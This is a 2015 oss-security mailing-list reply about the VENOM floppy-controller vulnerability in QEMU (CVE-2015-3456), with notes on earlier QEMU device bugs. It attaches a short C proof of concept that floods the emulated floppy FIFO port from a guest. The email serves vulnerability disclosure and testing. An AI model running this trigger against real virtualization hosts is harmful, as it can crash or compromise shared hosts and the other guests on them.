X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1334" "Wednesday" "13" "May" "2015" "23:20:40" "+0200" "Marcus Meissner" "meissner@suse.de" "<20150513212040.GA22701@suse.de>" "40" "Re: [oss-security] VENOM - CVE-2015-3456" nil nil nil "5" "2015051321:20:40" "[oss-security] VENOM - CVE-2015-3456" (number mark "        meissner@sus May 13   40/1334  " thread-indent "\"Re: [oss-security] VENOM - CVE-2015-3456\"\n") "<20150513205720.GA20756@openwall.com>" ("<ba24ac6088a34b9d97fd721591f1e922@casmbox01.crowdstrike.sys>" "<20150513205720.GA20756@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 5979 invoked by uid 550); 13 May 2015 21:20:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 5960 invoked from network); 13 May 2015 21:20:52 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20150513212040.GA22701@suse.de>
References: <ba24ac6088a34b9d97fd721591f1e922@casmbox01.crowdstrike.sys>
 <20150513205720.GA20756@openwall.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="YiEDa0DAkWCtVeE4"
Content-Disposition: inline
In-Reply-To: <20150513205720.GA20756@openwall.com>
Organization: SUSE Linux GmbH, GF: =?iso-8859-1?Q?Felix_?=
 =?iso-8859-1?Q?Imend=F6rffer=2C_Jane_Smithard=2C_Dilip_Upmanyu=2C_Graham_?=
 =?iso-8859-1?Q?Norton=2C_HRB_21284_=28AG_N=FCrnberg=29?=
User-Agent: Mutt/1.5.21 (2010-09-15)
Date: Wed, 13 May 2015 23:20:40 +0200
From: Marcus Meissner <meissner@suse.de>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] VENOM - CVE-2015-3456
To: oss-security@lists.openwall.com

--YiEDa0DAkWCtVeE4
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Wed, May 13, 2015 at 11:57:20PM +0300, Solar Designer wrote:
> On Wed, May 13, 2015 at 12:22:19PM +0000, Jason Geffner wrote:
> > VENOM, CVE-2015-3456, is a security vulnerability in the virtual floppy drive code used by many computer virtualization platforms.
> 
> Some bits of contemporary history, off Twitter:
> 
> <nelhage> All I have to say about VENOM is that I was exploiting obsolete hardware in qemu years before it was cool.  https://blog.nelhage.com/2011/08/breaking-out-of-kvm/
> <solardiz> @nelhage I think @taviso was there first, with emulated Cirrus Logic VGA (CVE-2007-1320) and NE2000 vulns in QEMU.  http://taviso.decsystem.org/virtsec.pdf

Yeah, we fixed a lot of them, some less, some more exploitable.

As I had some confusion on if the fdc is disabled or not in regards to
the -nodefaults, so I wrote a small PoC.

(and no, -nodefaults does not disable the fdc)

Ciao, Marcus

--YiEDa0DAkWCtVeE4
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="xx.c"

#include <sys/io.h>

#define FIFO 0x3f5

int main() {
        int i;
        iopl(3);

        outb(0x0a,0x3f5); /* READ ID */
        for (i=0;i<10000000;i++)
                outb(0x42,0x3f5); /* push */
}

--YiEDa0DAkWCtVeE4--
